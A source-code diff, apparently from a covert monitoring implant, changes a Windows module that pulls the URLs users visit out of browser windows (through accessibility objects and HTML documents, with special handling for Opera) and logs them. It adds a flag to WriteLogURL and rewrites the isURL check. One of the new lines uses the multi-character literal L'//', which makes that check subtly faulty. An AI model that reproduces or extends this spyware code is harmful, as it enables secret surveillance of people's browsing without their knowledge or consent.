@@ -200,7 +200,7 @@ DWORD PM_SetWindowText_setup(HMServiceStruct *pData)
 }
 
 
-void WriteLogURL(WCHAR *url, UrlLogParamsStruct *pUrlLogParams)
+void WriteLogURL(WCHAR *url, UrlLogParamsStruct *pUrlLogParams, BOOL check_url)
 {
 	BYTE url_buffer[sizeof(url_info_struct)+MAXURLLEN*sizeof(WCHAR)];
 	url_info_struct *url_info = (url_info_struct *)url_buffer;
@@ -210,9 +210,8 @@ void WriteLogURL(WCHAR *url, UrlLogParamsStruct *pUrlLogParams)
 		return;
 
 	// Logghiamo solo i protocolli interessanti
-	if (wcsnicmp(url, L"http", 4) && 
-		wcsnicmp(url, L"ftp", 3))
-	return;
+	if (check_url && wcsnicmp(url, L"http", 4) && wcsnicmp(url, L"ftp", 3))
+		return;
 
 	_snwprintf_s(url_info->url_name, MAXURLLEN, _TRUNCATE, L"%s", url);
 
@@ -256,16 +255,16 @@ void WriteLogURL(WCHAR *url, UrlLogParamsStruct *pUrlLogParams)
 BOOL isURL(WCHAR *url)
 {
 	WCHAR *ptr;
-	ptr = wcschr(url, '.');
+	ptr = wcschr(url, L'.');
 	if (!ptr)
 		return FALSE;
 	ptr++;
-	if ((*ptr) == 0)
+	if ((*ptr) == 0 || (*ptr) == L'.')
 		return FALSE;
 	ptr++;
-	ptr = wcschr(url, '.');
-	if (!ptr)
+	if (!wcschr(ptr, L'.') && !wcschr(ptr, L'//')) 
 		return FALSE;
+
 	return TRUE;
 }
 
@@ -285,7 +284,7 @@ void URLOleWalk(IAccessible* iAcc, UrlLogParamsStruct *pUrlLogParams, int deep)
 	if (iAcc->get_accValue(vChild, &val) == S_OK) {
 		if (val) {
 			if (!wcsncmp(val, L"http", wcslen(L"http")) || (pUrlLogParams->browser_type == BROWSER_OPERA && isURL(val)) ) {
-				WriteLogURL(val, pUrlLogParams);
+				WriteLogURL(val, pUrlLogParams, FALSE);
 				m_url_found = TRUE;
 				SysFreeString(val);
 				return;
@@ -369,7 +368,7 @@ BOOL CALLBACK URLEnumChildProc(HWND hwnd,LPARAM pUrlLogParams)
 
 			hr = spDoc->get_URL(&url);
 			if (SUCCEEDED(hr)) {
-				WriteLogURL(url, (UrlLogParamsStruct *)pUrlLogParams);
+				WriteLogURL(url, (UrlLogParamsStruct *)pUrlLogParams, TRUE);
 				if (url)
 					SysFreeString(url);
 			}
@@ -396,7 +395,7 @@ BOOL CALLBACK URLEnumChildProc(HWND hwnd,LPARAM pUrlLogParams)
 						if (!SUCCEEDED(hr)) 
 							doctype = NULL;
 						if (!doctype || wcscmp(doctype, L"window")) {
-							WriteLogURL(url, (UrlLogParamsStruct *)pUrlLogParams);
+							WriteLogURL(url, (UrlLogParamsStruct *)pUrlLogParams, TRUE);
 							ret_val = FALSE;
 						}
 						if (doctype)
